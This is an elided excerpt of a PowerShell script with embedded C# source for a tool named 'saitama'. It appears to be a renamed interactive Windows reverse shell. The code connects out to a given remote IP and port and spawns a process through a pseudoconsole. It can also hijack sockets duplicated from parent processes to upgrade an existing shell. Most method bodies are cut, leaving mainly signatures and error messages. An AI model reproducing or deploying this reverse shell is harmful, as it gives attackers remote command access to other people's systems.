...
{   
    ...
    $parameterssaitama = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
    Add-Type -TypeDefinition $Source -Language CSharp;
    $output = [saitamaMainClass]::saitamaMain($parameterssaitama)
    Write-Output $output
}
...
public class saitamaException : Exception
{
    private const string error_string = "[-] saitamaException: ";

    public saitamaException() { }

    public saitamaException(string message) : base(error_string + message) { }
}
...
public static class SocketHijacking
{
    ...
    public static IntPtr DuplicateTargetProcessSocket(Process targetProcess, ref bool overlappedSocket)
    {
        ...
        if (targetSocketHandle == IntPtr.Zero)
            throw new saitamaException("No sockets found, so no hijackable sockets :( Exiting...");
    ...
    public static void SetSocketBlockingMode(IntPtr socket, int mode)
    {
        ...
        if (result == -1)
            throw new saitamaException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
    }
}
...
public struct ParentProcessUtilities
{
    ...
    public static Process GetParentProcess(IntPtr handle)
    {
        ...
        if (status != 0)
            throw new saitamaException(status.ToString());
        try
        {
...
public static class saitama
{
    private const string errorString = "{{{saitamaException}}}\r\n";
    ...
    private static void InitWSAThread()
    {
        ...
        if (WSAStartup(2 << 8 | 2, out data) != 0)
            throw new saitamaException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
    }
    ...
    private static IntPtr connectRemote(string remoteIp, int remotePort)
    {
        ...
        {
            throw new saitamaException("Specified port is invalid: " + remotePort.ToString());
        }
        ...
        if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
        {
            ...
            throw new saitamaException(String.Format("WSAConnect failed with error code: {0}", error));
        }
    ...
    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite)
    {
        ...
        if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new saitamaException("Could not create the InputPipe");
        if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new saitamaException("Could not create the OutputPipe");
    }
    ...
    private static void EnableVirtualTerminalSequenceProcessing()
    {
        ...
        {
            throw new saitamaException("Could not get console mode");
        }
        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
        if (!SetConsoleMode(hStdOut, outConsoleMode))
        {
            throw new saitamaException("Could not enable virtual terminal processing");
        }
    }
    ...
    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
    {
        ...
        {
            throw new saitamaException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
        }
        ...
        if (!success)
        {
            throw new saitamaException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
        }
        ...
        if (!success)
        {
            throw new saitamaException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
        }
        return startupInfo;
    }
    ...
    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
    {
        ...
        if (!success)
        {
            throw new saitamaException("Could not create process. " + Marshal.GetLastWin32Error());
        }
        return pInfo;
    }
    ...
    public static string Spawnsaitama(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
    {
            ...
            if (upgradeShell)
            {
                ...
                if (shellSocket == IntPtr.Zero && parentProcess != null)
                {
                    ...
                    if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                    {
                        ...
                        {
                            throw new saitamaException("No \\Device\\Afd objects found. Socket duplication failed.");
                        }
                        else
                        {
        ...
        output += "saitama kindly exited.\r\n";
        return output;
    }
}

public static class saitamaMainClass
{
    ...
    private static void CheckArgs(string[] arguments)
    {
        if (arguments.Length < 2)
            throw new saitamaException("\r\nsaitama: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
    }
    ...
    private static string CheckRemoteIpArg(string ipString)
    {
        ...
        if (!IPAddress.TryParse(ipString, out address))
            throw new saitamaException("\r\nsaitama: Invalid remoteIp value" + ipString);
        return ipString;
    }
    ...
    private static int CheckInt(string arg)
    {
        ...
        if (!Int32.TryParse(arg, out ret))
            throw new saitamaException("\r\nsaitama: Invalid integer value " + arg);
        return ret;
    }
    ...
    public static string saitamaMain(string[] args)
    {
        string output = "";
        ...
        else
        {
            ...
            try
            {
                ...
                output = saitama.Spawnsaitama(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
            }
            catch (Exception e)
            {
                Console.WriteLine("\n" + e.ToString() + "\n");
...
class MainClass
{
    ...
    {
        Console.Out.Write(saitamaMainClass.saitamaMain(args));
    }
}
